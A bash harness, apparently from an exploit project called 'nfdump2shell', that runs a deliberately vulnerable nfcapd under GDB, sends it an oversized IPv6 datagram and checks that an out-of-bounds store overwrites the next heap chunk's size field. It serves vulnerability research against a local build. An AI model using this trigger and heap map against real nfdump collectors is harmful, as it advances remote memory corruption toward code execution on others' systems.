#!/usr/bin/env bash
# nfdump2shell: measure the live heap object hit by the IPv6 allocation crossing.
# The genuine plain collector's 65535-byte in_buff chunk is immediately followed
# by the 32-byte chunk holding the flow-source ident string.  The maximum IPv6
# UDP datagram places the truncated-flow msecReceived store at in_buff+65543,
# i.e. 7 bytes into that next chunk's header and across 7 bytes of its size
# field.  This runner reads those offsets from the running process with GDB;
# no source, build or packet bytes are synthetic.
set -u
cd "$(dirname "$0")"
VP=${V_PLAIN:-src/build-vuln-plain/src}
OUT=${V6HEAP_OUT:-harness/out/v6heap}
PORT=${V6HEAP_PORT:-10264}

if ! command -v gdb >/dev/null 2>&1; then
    echo "FAIL gdb required for live heap-map measurement"
    exit 2
fi
if [ ! -x "$VP/nfcapd/.libs/nfcapd" ]; then
    bash build-wire.sh || exit 2
fi
mkdir -p "$OUT"

DIR=$(mktemp -d "${TMPDIR:-/tmp}/nfd-v6heap.XXXXXX") || exit 2
trap 'rm -rf "$DIR"' EXIT
mkdir -p "$DIR/flows"
CMD="$DIR/gdb.cmd"
cat >"$CMD" <<EOF
set pagination off
set confirm off
set breakpoint pending on
break nfd_raw.c:256
run -6 -b ::1 -p $PORT -M $DIR/flows -t 10
printf "=== HIT Process_nfd:256 ===\\n"
set \$gbuf = (char *)in_buff
set \$gchunk = (*(unsigned long *)(\$gbuf - 8) & ~7)
set \$ghdr = \$gbuf - 16 + \$gchunk
set \$gtarget = \$gbuf + 65543
printf "HEAPMAP in_buff=%p chunk_size=%lu hdr_off=%ld next_chunk=%p target=%p target_off=%ld size_field=%lu\\n", in_buff, \$gchunk, \$ghdr - \$gbuf, \$ghdr, \$gtarget, \$gtarget - \$ghdr, *(unsigned long *)(\$ghdr + 8)
x/s \$ghdr + 16
kill
quit
EOF

LD_LIBRARY_PATH="$PWD/src/build-vuln-plain/src/libnffile/.libs:${LD_LIBRARY_PATH:-}" \
    gdb -q -batch -x "$CMD" --args "$VP/nfcapd/.libs/nfcapd" >"$DIR/gdb.log" 2>&1 &
GDBPID=$!
sleep 2
python3 harness/wire_send.py "$PORT" v6edge >"$DIR/sender.log" 2>&1
for _ in $(seq 1 40); do
    grep -qa '=== HIT Process_nfd:256 ===' "$DIR/gdb.log" && break
    sleep 0.25
done
wait "$GDBPID" || true
cp "$DIR/gdb.log" "$OUT/gdb.log"
cp "$DIR/sender.log" "$OUT/sender.log"

PASS=0; FAIL=0
ok()  { printf 'PASS %s\n' "$1"; PASS=$((PASS+1)); }
bad() { printf 'FAIL %s\n' "$1"; FAIL=$((FAIL+1)); }
need() { if grep -qa -e "$2" "$3" 2>/dev/null; then ok "$1"; else bad "$1"; fi; }

need 'wire datagram is the 65527-byte IPv6 maximum' 'WIRE_LEN=65527' "$DIR/sender.log"
need 'breakpoint reached in the live pinned Process_nfd' 'HIT Process_nfd:256' "$DIR/gdb.log"
need 'receive allocation is the pinned 65535-byte request rounded to 65552' 'chunk_size=65552' "$DIR/gdb.log"
need 'next chunk header is 65536 bytes after in_buff' 'hdr_off=65536' "$DIR/gdb.log"
need 'store lands 7 bytes into the next chunk header' 'target_off=7' "$DIR/gdb.log"
need 'next chunk holds the source ident string' '"--1"' "$DIR/gdb.log"
need 'next chunk size field is the small live 32-byte chunk' 'size_field=33' "$DIR/gdb.log"

printf '=== measured heap map ===\n'
grep -aE 'HEAPMAP|0x.*"--1"|HIT Process_nfd' "$DIR/gdb.log" || true
printf 'TOTAL: %d PASS / %d FAIL\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
